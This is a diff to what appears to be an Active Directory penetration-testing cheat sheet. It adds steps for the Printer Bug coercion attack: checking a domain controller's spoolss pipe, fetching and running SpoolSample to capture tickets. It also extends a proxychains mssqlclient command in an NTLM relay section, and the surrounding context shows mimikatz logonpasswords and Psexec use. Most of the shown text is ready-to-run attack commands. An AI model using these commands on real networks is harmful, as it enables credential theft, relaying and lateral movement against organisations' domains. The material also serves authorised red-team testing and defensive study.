@@ -111,6 +111,13 @@ mimikatz# sekurlsa::logonpasswords
 ## Unconstrained Delegation
 ### Printer Bug
 Using spooler service to authenticate between domain computers(that runs spooler svc). Attackers can monitor incoming tickets with `Rubeus`.
+
+1. Verify that remote computer has spooler service running
+```
+ls \\dc01.contoso.local\pipe\spoolss
+```
+
+2. Download spoolsample [here](https://github.com/leechristensen/SpoolSample) and run the following command to authenticate and capture ticket.
 ```
 # run this on domain joined computers
 spoolsample.exe dc01.contoso.local ms01.contoso.local
@@ -299,7 +306,7 @@ ntlmrelayx.py -tf targets.txt -smb2support -socks
 proxychains Psexec.py contoso/administrator:''@192.168.0.10
 
 # mssqlclient
-proxychains mssqlclient.py contoso/sqlsvc:''@192.168.0.15
+proxychains mssqlclient.py contoso/sqlsvc:''@192.168.0.15 -windows-auth -debug
 ```
 
 ## Remote Authentication Between Computers
